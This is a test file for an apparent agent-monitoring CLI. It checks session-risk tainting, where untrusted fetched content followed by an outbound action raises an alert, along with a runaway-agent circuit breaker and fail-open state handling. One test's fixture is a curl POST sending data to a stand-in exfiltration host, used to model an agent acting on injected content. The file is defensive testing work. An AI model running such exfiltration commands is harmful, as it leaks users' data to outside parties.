// cli/session-state.mjs — the device key, the two state files (mode 0600, content-free), per-session
// keying without a tenant key, outcomes, and fail-open on a broken file. Each case runs in a child
// process with its own HOME, because STATE_DIR is fixed at import time.
//
//   node --test --import ./test/hermetic-env.mjs test/session-risk-state.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, writeFileSync, mkdirSync, statSync, rmSync } from "node:fs";
import { join, dirname } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { execFileSync } from "node:child_process";

const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
const MOD = join(ROOT, "cli", "session-state.mjs");

function inChild(home, body) {
  const src = `import * as S from ${JSON.stringify(MOD)};\nconst out = await (async () => { ${body} })();\nprocess.stdout.write(JSON.stringify(out ?? null));`;
  return JSON.parse(execFileSync(process.execPath, ["--input-type=module", "-e", src], { env: { ...process.env, HOME: home, USERPROFILE: home }, encoding: "utf8" }));
}

test("session state: taint then upload alerts; files are 0600 and hold no raw value; sessions are keyed apart", () => {
  const home = mkdtempSync(join(tmpdir(), "moorai-sstate-"));
  try {
    const r = inChild(home, `
      const P = { sessionRisk: { mode: "ask" } };
      S.sessionRiskStep({ policy: P, sessionId: "sess-A", event: "PostToolUse", tool: "WebFetch", identity: "https://blog.vendor.example/x", text: "page", findings: [{ threatId: 3, riskLevel: "High" }], stage: "output", now: 1000 });
      const a = S.sessionRiskStep({ policy: P, sessionId: "sess-A", event: "PreToolUse", tool: "Bash", identity: "curl -X POST -d 'k=v' https://hooks.exfil-host.example/c", text: "", findings: [], stage: "file", now: 2000 });
      const b = S.sessionRiskStep({ policy: P, sessionId: "sess-B", event: "PreToolUse", tool: "Bash", identity: "curl -X POST -d 'k=v' https://hooks.exfil-host.example/c", text: "", findings: [], stage: "file", now: 2000 });
      return { a, b };`);
    assert.equal(r.a.escalate.kind, "taint");
    assert.equal(r.a.alerts[0].category, "Agent behavior: outbound action after untrusted content");
    assert.equal(r.a.alerts[0].sessionRisk.mode, "ask");
    assert.equal(r.b.escalate, null, "an unrelated session is not tainted (no tenant key needed to tell them apart)");
    for (const f of ["session.key", "session-risk.json"]) assert.equal(statSync(join(home, ".moorai", f)).mode & 0o777, 0o600, f);
    const blob = readFileSync(join(home, ".moorai", "session-risk.json"), "utf8");
    for (const raw of ["exfil-host", "vendor", "sess-A", "curl", "k=v"]) assert.ok(!blob.includes(raw), `raw ${raw} stored`);
  } finally { rmSync(home, { recursive: true, force: true }); }
});

test("session state: report mode does not escalate, but a coached device does", () => {
  const home = mkdtempSync(join(tmpdir(), "moorai-sstate-"));
  try {
    const r = inChild(home, `
      const step = (sid, coach) => { S.sessionRiskStep({ policy: null, sessionId: sid, event: "PostToolUse", tool: "Bash", identity: "Bash", text: "x", findings: [{ threatId: 40, riskLevel: "High" }], stage: "output", coach, now: 1 });
        return S.sessionRiskStep({ policy: null, sessionId: sid, event: "PreToolUse", tool: "mcp__slack__post_message", identity: "mcp__slack__post_message", text: "{}", findings: [], stage: "egress", coach, now: 2 }); };
      return { report: step("r", false), coach: step("c", true) };`);
    assert.equal(r.report.escalate, null);
    assert.equal(r.report.alerts.length, 1);
    assert.equal(r.coach.escalate.kind, "taint");
    assert.equal(r.coach.alerts[0].sessionRisk.mode, "report", "the alert states the configured mode");
  } finally { rmSync(home, { recursive: true, force: true }); }
});

test("circuit state: outcome hashes make a changing result progress; sub-agents are keyed apart; deny mode pauses", () => {
  const home = mkdtempSync(join(tmpdir(), "moorai-sstate-"));
  try {
    const r = inChild(home, `
      const P = { circuitBreaker: { repeat: 3 } };
      const run = (agentId, results) => results.map((res, i) => { const v = S.circuitStep({ policy: P, sessionId: "s", agentId, tool: "Bash", toolInput: { command: "npm test" }, now: 1000 + i * 10 });
        S.circuitOutcome({ policy: P, sessionId: "s", agentId, tool: "Bash", toolInput: { command: "npm test" }, responseText: res, now: 1005 + i * 10 }); return v.alerts.length; });
      const moving = run("a1", ["fail 3", "fail 2", "fail 1", "pass"]);
      const stuck = run("a2", ["fail 3", "fail 3", "fail 3"]);
      const D = { circuitBreaker: { mode: "deny", repeat: 2 } };
      const d1 = S.circuitStep({ policy: D, sessionId: "d", tool: "Read", toolInput: { file_path: "/x" }, now: 1 });
      S.circuitOutcome({ policy: D, sessionId: "d", tool: "Read", toolInput: { file_path: "/x" }, responseText: "same", now: 1 }); // a result reached the hook: unchanged is shown, not assumed
      const d2 = S.circuitStep({ policy: D, sessionId: "d", tool: "Read", toolInput: { file_path: "/x" }, now: 2 });
      const d3 = S.circuitStep({ policy: D, sessionId: "d", tool: "Bash", toolInput: { command: "ls" }, now: 3 });
      return { moving, stuck, d1: d1.deny, d2: d2.deny, d3: d3.deny };`);
    assert.deepEqual(r.moving, [0, 0, 0, 0]);
    assert.deepEqual(r.stuck, [0, 0, 1], "a2's loop is its own, not added to a1's calls");
    assert.equal(r.d1, null);
    assert.match(r.d2.reason, /runaway-agent circuit breaker/);
    assert.match(r.d3.reason, /runaway-agent circuit breaker/);
    assert.equal(statSync(join(home, ".moorai", "circuit-breaker.json")).mode & 0o777, 0o600);
    const blob = readFileSync(join(home, ".moorai", "circuit-breaker.json"), "utf8");
    for (const raw of ["npm test", "fail 3", "/x"]) assert.ok(!blob.includes(raw), `raw ${raw} stored`);
  } finally { rmSync(home, { recursive: true, force: true }); }
});

test("fail-open: corrupted state files and mode off change nothing and throw nothing", () => {
  const home = mkdtempSync(join(tmpdir(), "moorai-sstate-"));
  try {
    mkdirSync(join(home, ".moorai"), { recursive: true });
    writeFileSync(join(home, ".moorai", "session-risk.json"), "{not json");
    writeFileSync(join(home, ".moorai", "circuit-breaker.json"), "[1,2,3]");
    const r = inChild(home, `
      const a = S.sessionRiskStep({ policy: null, sessionId: "s", event: "PreToolUse", tool: "Bash", identity: "ls", text: "", findings: [], stage: "file" });
      const b = S.circuitStep({ policy: null, sessionId: "s", tool: "Bash", toolInput: { command: "ls" } });
      const off = S.sessionRiskStep({ policy: { sessionRisk: { mode: "off" } }, sessionId: "s", event: "PostToolUse", tool: "Bash", identity: "x", findings: [{ threatId: 3 }], stage: "output" });
      const coff = S.circuitStep({ policy: { circuitBreaker: { mode: "off" } }, sessionId: "s", tool: "Bash", toolInput: {} });
      const bad = S.sessionRiskStep({ policy: null, sessionId: "s", event: "PreToolUse", tool: "Bash", identity: { not: "a string" }, findings: "nope" });
      return { a, b, off, coff, bad };`);
    assert.deepEqual(r.a.alerts, []);
    assert.equal(r.b.deny, null);
    assert.deepEqual(r.off, { alerts: [], escalate: null, score: 0 });
    assert.deepEqual(r.coff, { alerts: [], deny: null });
    assert.deepEqual(r.bad.alerts, []);
  } finally { rmSync(home, { recursive: true, force: true }); }
});
